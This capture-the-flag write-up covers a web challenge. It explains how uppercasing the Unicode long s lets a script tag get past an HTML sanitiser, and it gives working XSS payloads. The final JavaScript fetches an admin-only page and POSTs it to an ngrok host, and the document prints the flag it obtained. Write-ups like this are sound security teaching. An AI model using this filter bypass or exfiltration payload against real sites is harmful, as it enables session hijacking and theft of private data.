# posts (310pts, 20 solved) Web & XSS [Medium]

## First look
When we open the website, we need to create an account or login. After doing that, we have some options to the right, `Posts` & `Dashboard`. The `Dashboard` function is the home page and on the `Posts` window, we can create and see our posts.  
When we create a post, we get a message: `Post created sucessfully. Now we are waiting for adming review.`  
Now we can review our post by going to the `Posts` window and clicking on one. We notice that our title is uppercased.

## Solving
From the page source, of a post, we can see that it tries to sanitze our input:
```js
function header(title, description) {
    if (typeof title != 'string') {
        return;
    }
    title = title.replace(/<([a-z])/ig, '&lt;_$1');
    title = title.toUpperCase();
    // console.log(title)
    $('#response').html('<h1 class="special">' + title + '</h1>' + description.replace(/<([a-z])/ig, '&lt;_$1'));
}

$(document).ready(function() {
    header(decodeURIComponent("foo"), decodeURIComponent("bar"));
});
```
From this, we notice that from our title and description, all things, starting with `<` followed by a letter: `a-z` (case insensitive), will be replaced with `&lt;_{input}`. This santizes the `description` properly, because there is no HTML element starting with a non `a-z` letter.  
However, our title is also uppercased, which we could to inject `A-Z` letters, because uppercasing some `Unicode` characters, will result into `ASCII` ones. We can create a quick script to bruteforce such a character:  
```js
let found = false;
let charToFind = "S";
let currentChar = 0;
while (!found) {
    let candidate = String.fromCharCode(currentChar);
    if (candidate.toUpperCase() == charToFind && candidate != charToFind && candidate != charToFind.toLowerCase()) {
        console.log(candidate);
        found = true;
    }
    currentChar++;
}
```
Which return the character: `ſ`.  

_Note: We're using a normal `script` tag for this. We do this, because if we use an `img` element, our code is also uppercased. And sice the code uses the `JQuery`, `html` function and not `innerHtml` variable, the script is normally loaded_  
_Note: We're also using `script`, because the host of our `script.src` is not uppercased, only the `query`, `parameters` & `path`_  
_Note: Spaces are replaced with `+` in our `title`_  
Keeping the above in mind, we can create our payload:
```html
<ſcript/src="http://{id}.ngrok.io"></script>
```
We're using `ngrok`, so we don't have to deal with the `Uri.path`  
And after we found where the flag was, we could send it to the same `ngrok`. Final payload:
```js
(async function() {
    let data = await fetch("/index.php?page=post&id=1");
    let text = await data.text();

    let res = await fetch("http://{id}.ngrok.io", {
        method: 'POST',
        body: text
    })
})();
```
And after a second, we get our flag: `DCTF{2299f10ed7b61518956b70f22f32d47916bca4d8a608ef4d62c1d881851a6771}`